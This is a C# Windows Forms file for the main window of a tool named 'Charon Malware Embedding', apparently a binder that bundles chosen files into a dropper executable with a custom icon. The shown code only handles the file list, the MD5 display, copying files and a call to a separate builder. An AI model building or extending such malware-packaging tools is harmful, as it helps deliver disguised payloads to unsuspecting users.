using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Charon_Malware_Embedding
{
    public partial class MainWindow : Form
    {
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HTCAPTION = 0x2;

        [DllImport("User32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("User32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        public MainWindow()
        {
            InitializeComponent();
            this.Paint += new PaintEventHandler(MainWindow_Paint);
            //this.IsMdiContainer = true;
        }


        private void MainWindow_Paint(object sender, PaintEventArgs e)
        {
            ControlPaint.DrawBorder(e.Graphics, this.ClientRectangle, Color.FromArgb(0, 135, 230), ButtonBorderStyle.Solid);
        }


        private void MainWindow_Load(object sender, EventArgs e)
        {
            FilesList.View = View.Details;
            FilesList.FullRowSelect = true;
            FilesList.Columns.Add("File Name", 150);
            FilesList.Columns.Add("File Path", 200);
            FilesList.Columns.Add("File Size", 80);
            FilesList.Columns.Add("File Lenght", 80);
            FilesList.Columns.Add("MD5", 250);
            FilesList.SmallImageList = new ImageList();


        }

        private void Close_btn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Minmize_btn_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        //private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    foreach (ListViewItem item in FilesList.SelectedItems)
        //    {
        //        FilesList.Items.Remove(item);
        //    }
        //}

        //private void deleteAllFilesToolStripMenuItem_Click_1(object sender, EventArgs e)
        //{
        //    foreach (ListViewItem item in FilesList.Items)
        //    {
        //        FilesList.Items.Remove(item);
        //    }

        //}

        //private void configurationToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    Form Configure = new ConfigurationWindow();
        //    Configure.Show();
        //}

        //private void softwareToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    AboutSoftware aboutsoftware = new AboutSoftware();
        //    aboutsoftware.Show();
        //}

        //private void githubToolStripMenuItem_Click(object sender, EventArgs e)
        //        {
        //            string url = "https://github.com/Ch4120N";

        //            // Open the URL in the default web browser
        //            Process.Start(new ProcessStartInfo
        //            {
        //                FileName = url,
        //                UseShellExecute = true
        //            });
        //        }


        //private void addToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    using (OpenFileDialog openFileDialog = new OpenFileDialog())
        //    {
        //        openFileDialog.Multiselect = true;
        //        if (openFileDialog.ShowDialog() == DialogResult.OK)
        //        {
        //            foreach (string filePath in openFileDialog.FileNames)
        //            {
        //                GetFileInfo(filePath);
        //            }
        //        }
        //    }
        //}


        private void GetFileInfo(string filePath)
        {
            // Get file name
            string fileName = Path.GetFileName(filePath);

            // Get full path
            string fileFullPath = Path.GetFullPath(filePath);

            // Get file size
            FileInfo fileInfo = new FileInfo(filePath);
            long fileSize = fileInfo.Length;
            double fileSizeMB = Tools.Utils.BytesToMegabytes(fileSize);

            // Calculate MD5 hash
            string fileMD5 = Tools.Utils.CalculateMD5(filePath);

            // Get file icon (Windows specific)
            Icon fileIcon = Tools.Utils.GetFileIcon(filePath);

            // Create ListViewItem
            ListViewItem item = new ListViewItem(fileName);
            item.SubItems.Add(fileFullPath);
            //item
            item.SubItems.Add(fileSizeMB.ToString("F2") + " MB");
            item.SubItems.Add(fileSize.ToString() + " Bytes");
            item.SubItems.Add(fileMD5);

            // Add icon to ImageList and set the ListViewItem's image index
            if (fileIcon != null)
            {
                FilesList.SmallImageList.Images.Add(fileIcon);
                item.ImageIndex = FilesList.SmallImageList.Images.Count - 1;
            }

            // Add item to ListView
            FilesList.Items.Add(item);
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HTCAPTION, 0);
            }
        }

        private void buildToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (Directory.Exists(Config.TempDIR))
                {
                    Directory.Delete(Config.TempDIR, true);
                    Directory.CreateDirectory(Config.TempDIR);
                }
                else
                {
                    Directory.CreateDirectory(Config.TempDIR);
                }



            }
            catch
            {

            }
            if (!Directory.Exists(Config.TempFilesDIR))
            {
                Directory.CreateDirectory(Config.TempFilesDIR);
            }
            string srcPath = null;
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                foreach (string filePath in saveFileDialog1.FileNames)
                {
                    string res;
                    res = filePath.ToString();
                    srcPath += res;

                }
            }
            List<string> filePathListsToBuild = new List<string> { };
            foreach (ListViewItem item in FilesList.Items)
            {
                string fileName = item.Text;
                string filePath = item.SubItems[1].Text;

                filePathListsToBuild.Add(filePath);
                //string fileName = item.Text;
                //string filePath = item.SubItems[1].Text;

            }

            foreach (var filePathCopy in filePathListsToBuild)
            {
                Tools.Utils.CopyFiles(filePathCopy, Config.TempFilesDIR + Path.GetFileName(filePathCopy));
            }

            Directory.SetCurrentDirectory(Config.TempFilesDIR);

            ////string argsString = string.Join(" ", filePathListsToBuild);
            string filePathes = string.Join(" ", filePathListsToBuild);
            string argsString = "*";

            Tools.Builder.Generate(srcPath, Config.ConfigTemplate, Config.OptationSystem, argsString, filePathes, Config.DroppedFileIn, Config.IconPath);

            //ProgressBuilding ProgressBarFormStatus = new ProgressBuilding();
            //ProgressBarFormStatus.StartPosition = FormStartPosition.CenterScreen;

        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Multiselect = true;
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    foreach (string filePath in openFileDialog.FileNames)
                    {
                        GetFileInfo(filePath);
                    }
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in FilesList.SelectedItems)
            {
                FilesList.Items.Remove(item);
            }
        }

        private void deleteAllFilesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in FilesList.Items)
            {
                FilesList.Items.Remove(item);
            }
        }

        private void configurationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form Configure = new ConfigurationWindow();
            Configure.Show();
        }

        private void softwareToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AboutSoftware aboutsoftware = new AboutSoftware();
            aboutsoftware.Show();
        }

        private void githubToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string url = "https://github.com/Ch4120N";

            // Open the URL in the default web browser
            Process.Start(new ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true
            });
        }
    }
}
